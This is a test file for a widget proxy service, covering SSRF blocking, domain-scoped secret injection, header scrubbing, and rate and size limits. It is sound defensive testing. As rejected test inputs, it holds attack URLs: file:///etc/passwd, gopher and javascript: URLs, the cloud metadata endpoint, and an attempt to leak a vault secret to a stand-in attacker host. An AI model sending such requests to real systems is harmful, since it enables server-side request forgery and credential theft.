import { describe, expect, test } from "bun:test";
import { WidgetProxyService } from "../src/services/proxy/widget-proxy-service";
import { isBlockedIpv4, isBlockedIpv6, matchDomain, validateTargetUrl } from "../src/services/proxy/ssrf";
import { SecretVaultService } from "../src/services/vault/secret-vault-service";
import { createApp } from "../src/app";
import { InMemoryCanvasService } from "../src/services/canvas/in-memory-canvas-service";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { WidgetRuntime } from "../../../packages/widget-sdk/src/runtime";

describe("SSRF & Target URL Validation", () => {
  test("identifies blocked IPv4 ranges correctly", () => {
    expect(isBlockedIpv4("127.0.0.1").blocked).toBe(true);
    expect(isBlockedIpv4("127.255.255.254").blocked).toBe(true);
    expect(isBlockedIpv4("169.254.169.254").blocked).toBe(true); // AWS/GCP metadata
    expect(isBlockedIpv4("10.0.0.1").blocked).toBe(true);
    expect(isBlockedIpv4("192.168.1.1").blocked).toBe(true);
    expect(isBlockedIpv4("172.16.0.1").blocked).toBe(true);
    expect(isBlockedIpv4("0.0.0.0").blocked).toBe(true);
    expect(isBlockedIpv4("224.0.0.1").blocked).toBe(true);

    // Public IPs should not be blocked
    expect(isBlockedIpv4("8.8.8.8").blocked).toBe(false);
    expect(isBlockedIpv4("1.1.1.1").blocked).toBe(false);
    expect(isBlockedIpv4("93.184.216.34").blocked).toBe(false);
  });

  test("identifies blocked IPv6 ranges correctly", () => {
    expect(isBlockedIpv6("::1").blocked).toBe(true);
    expect(isBlockedIpv6("fe80::1").blocked).toBe(true); // Link-local
    expect(isBlockedIpv6("fc00::1").blocked).toBe(true); // ULA
    expect(isBlockedIpv6("fd12::1").blocked).toBe(true); // ULA
    expect(isBlockedIpv6("::ffff:127.0.0.1").blocked).toBe(true); // IPv4-mapped loopback
    expect(isBlockedIpv6("::ffff:169.254.169.254").blocked).toBe(true); // IPv4-mapped metadata
  });

  test("domain matching supports exact match, wildcard subdomains, and glob", () => {
    expect(matchDomain("api.openweathermap.org", "api.openweathermap.org")).toBe(true);
    expect(matchDomain("sub.api.openweathermap.org", "*.openweathermap.org")).toBe(true);
    expect(matchDomain("openweathermap.org", "*.openweathermap.org")).toBe(true);
    expect(matchDomain("attacker.org", "*.openweathermap.org")).toBe(false);
    expect(matchDomain("evil-openweathermap.org", "*.openweathermap.org")).toBe(false);
    expect(matchDomain("anything.com", "*")).toBe(true);
  });

  test("rejects dangerous protocols and loopback hostnames", async () => {
    expect((await validateTargetUrl("file:///etc/passwd")).safe).toBe(false);
    expect((await validateTargetUrl("gopher://127.0.0.1:70")).safe).toBe(false);
    expect((await validateTargetUrl("javascript:alert(1)")).safe).toBe(false);
    expect((await validateTargetUrl("http://localhost:3000")).safe).toBe(false);
    expect((await validateTargetUrl("http://127.0.0.1:8080")).safe).toBe(false);
    expect((await validateTargetUrl("http://169.254.169.254/latest/meta-data")).safe).toBe(false);
    expect((await validateTargetUrl("http://192.168.1.100/admin")).safe).toBe(false);
  });

  test("permits internal hosts when explicitly in allowlist", async () => {
    const allowed = ["homeassistant.local", "192.168.1.50"];
    expect((await validateTargetUrl("http://homeassistant.local:8123/api", allowed)).safe).toBe(true);
    expect((await validateTargetUrl("http://192.168.1.50:8080/metrics", allowed)).safe).toBe(true);
    // Other internal hosts still blocked
    expect((await validateTargetUrl("http://192.168.1.1/router", allowed)).safe).toBe(false);
  });
});

describe("WidgetProxyService & Secret Injection", () => {
  test("substitutes vault secrets when domain matches, and denies when domain mismatched", async () => {
    const dir = await mkdtemp(join(tmpdir(), "ld-proxy-vault-"));
    try {
      const vault = new SecretVaultService(dir);
      await vault.initialize();

      await vault.saveSecret({
        id: "weather_token",
        name: "Weather API Token",
        value: "secret-key-xyz-999",
        allowedDomains: ["api.weather.gov", "*.openweathermap.org"],
      });

      // Mock fetch implementation for deterministic testing
      let lastFetchedUrl = "";
      let lastHeaders: Record<string, string> = {};
      const mockFetch = (async (url: string | URL | Request, init?: RequestInit) => {
        lastFetchedUrl = String(url);
        lastHeaders = (init?.headers as Record<string, string>) || {};
        return new Response(JSON.stringify({ temperature: 21, condition: "Sunny" }), {
          status: 200,
          headers: { "content-type": "application/json", "set-cookie": "session=secret" },
        });
      }) as unknown as typeof fetch;

      const proxy = new WidgetProxyService({
        vault,
        allowedInternalHosts: ["api.weather.gov", "api.openweathermap.org"],
        fetchFn: mockFetch,
      });

      // 1. Successful fetch with secret in URL and headers on allowed domain
      const res = await proxy.execute({
        instanceId: "widget_weather_1",
        url: "https://api.weather.gov/forecast?apiKey={{secret:weather_token}}",
        headers: {
          Authorization: "Bearer {{secret:weather_token}}",
          "X-Custom": "Test",
          Cookie: "malicious-cookie", // should be scrubbed
        },
      });

      expect(res.ok).toBe(true);
      if (res.ok) {
        expect(res.status).toBe(200);
        expect(lastFetchedUrl).toBe("https://api.weather.gov/forecast?apiKey=secret-key-xyz-999");
        expect(lastHeaders["Authorization"]).toBe("Bearer secret-key-xyz-999");
        expect(lastHeaders["cookie"]).toBeUndefined(); // scrubbed
        expect(res.headers["set-cookie"]).toBeUndefined(); // scrubbed response header
        const parsed = JSON.parse(res.data);
        expect(parsed.temperature).toBe(21);
      }

      // 2. Secret denied when target domain is not in secret's allowedDomains
      const deniedDomain = await proxy.execute({
        instanceId: "widget_weather_1",
        url: "https://api.attacker.com/steal?key={{secret:weather_token}}",
      });
      expect(deniedDomain.ok).toBe(false);
      if (!deniedDomain.ok) {
        expect(deniedDomain.error.code).toBe("secret_denied");
      }

      // 3. Secret denied when secret ID doesn't exist
      const nonExistent = await proxy.execute({
        instanceId: "widget_weather_1",
        url: "https://api.weather.gov/data?key={{secret:unknown_secret}}",
      });
      expect(nonExistent.ok).toBe(false);
      if (!nonExistent.ok) {
        expect(nonExistent.error.code).toBe("secret_denied");
      }
    } finally {
      await rm(dir, { recursive: true, force: true }).catch(() => {});
    }
  });

  test("enforces request and response size limits and rate limits", async () => {
    const mockFetch = (async () => {
      return new Response("ok", { status: 200 });
    }) as unknown as typeof fetch;

    const proxy = new WidgetProxyService({
      allowedInternalHosts: ["example.com"],
      maxRequestBodyBytes: 100, // Small 100-byte cap for test
      rateLimitPerMinute: 3, // Small 3 req/min cap
      fetchFn: mockFetch,
    });

    // 1. Oversized body is rejected
    const bigBodyRes = await proxy.execute({
      instanceId: "widget_test_1",
      url: "https://example.com/api",
      method: "POST",
      body: "a".repeat(150),
    });
    expect(bigBodyRes.ok).toBe(false);
    if (!bigBodyRes.ok) {
      expect(bigBodyRes.error.code).toBe("payload_too_large");
    }

    // 2. Rate limiting
    const r1 = await proxy.execute({ instanceId: "rate_tile", url: "https://example.com/1" });
    const r2 = await proxy.execute({ instanceId: "rate_tile", url: "https://example.com/2" });
    const r3 = await proxy.execute({ instanceId: "rate_tile", url: "https://example.com/3" });
    expect(r1.ok).toBe(true);
    expect(r2.ok).toBe(true);
    expect(r3.ok).toBe(true);

    const r4 = await proxy.execute({ instanceId: "rate_tile", url: "https://example.com/4" });
    expect(r4.ok).toBe(false);
    if (!r4.ok) {
      expect(r4.error.code).toBe("rate_limited");
    }
  });
});

describe("HTTP Route /api/v1/widget-proxy", () => {
  test("serves proxy requests over createApp HTTP pipeline", async () => {
    const mockFetch = (async (url: string | URL | Request) => {
      return new Response(JSON.stringify({ greeting: "Hello from Upstream API" }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }) as unknown as typeof fetch;

    const proxy = new WidgetProxyService({
      allowedInternalHosts: ["api.sample.org"],
      fetchFn: mockFetch,
    });

    const app = createApp({
      canvases: new InMemoryCanvasService(),
      proxy,
    });

    const res = await app(
      new Request("http://localhost/api/v1/widget-proxy", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          instanceId: "inst_demo",
          url: "https://api.sample.org/data",
        }),
      })
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as any;
    expect(body.ok).toBe(true);
    expect(body.status).toBe(200);
    expect(JSON.parse(body.data).greeting).toBe("Hello from Upstream API");
  });
});

describe("@glansk/widget-sdk context.http API", () => {
  test("handles fetch request and response through WidgetRuntime message bus", async () => {
    let hostReceivedFetch: any = null;

    // Simulated message bus between iframe and host
    let clientListener: ((event: any) => void) | null = null;
    const bus = {
      postMessage: (msg: any) => {
        if (msg.type === "connect") {
          setTimeout(() => {
            clientListener?.({
              data: {
                protocol: "glansk.widget.v1",
                type: "connected",
                instanceId: "w_http_test",
                nonce: "nonce_123",
                identity: { instanceId: "w_http_test", packageId: "demo", widgetId: "http-card" },
                config: {},
              },
            });
          }, 0);
        } else if (msg.type === "fetch") {
          hostReceivedFetch = msg;
          // Simulate host replying with fetch-result
          setTimeout(() => {
            clientListener?.({
              data: {
                protocol: "glansk.widget.v1",
                type: "fetch-result",
                instanceId: "w_http_test",
                nonce: "nonce_123",
                correlationId: msg.correlationId,
                ok: true,
                status: 200,
                statusText: "OK",
                headers: { "content-type": "application/json" },
                data: JSON.stringify({ city: "Tokyo", temp: 18 }),
              },
            });
          }, 0);
        }
      },
      addEventListener: (_type: string, listener: any) => {
        clientListener = listener;
      },
      removeEventListener: () => {
        clientListener = null;
      },
    };

    let fetchResult: any = null;

    const runtime = new WidgetRuntime(
      {
        mount: async (ctx) => {
          // Test context.http.get
          fetchResult = await ctx.http.get("https://api.weather.org/tokyo");
        },
      },
      undefined,
      bus as any
    );

    runtime.init({} as HTMLElement);

    // Wait a tick for mount and fetch
    await new Promise((r) => setTimeout(r, 100));

    expect(hostReceivedFetch).not.toBeNull();
    expect(hostReceivedFetch.type).toBe("fetch");
    expect(hostReceivedFetch.url).toBe("https://api.weather.org/tokyo");
    expect(fetchResult).toEqual({ city: "Tokyo", temp: 18 });

    runtime.destroy();
  });
});
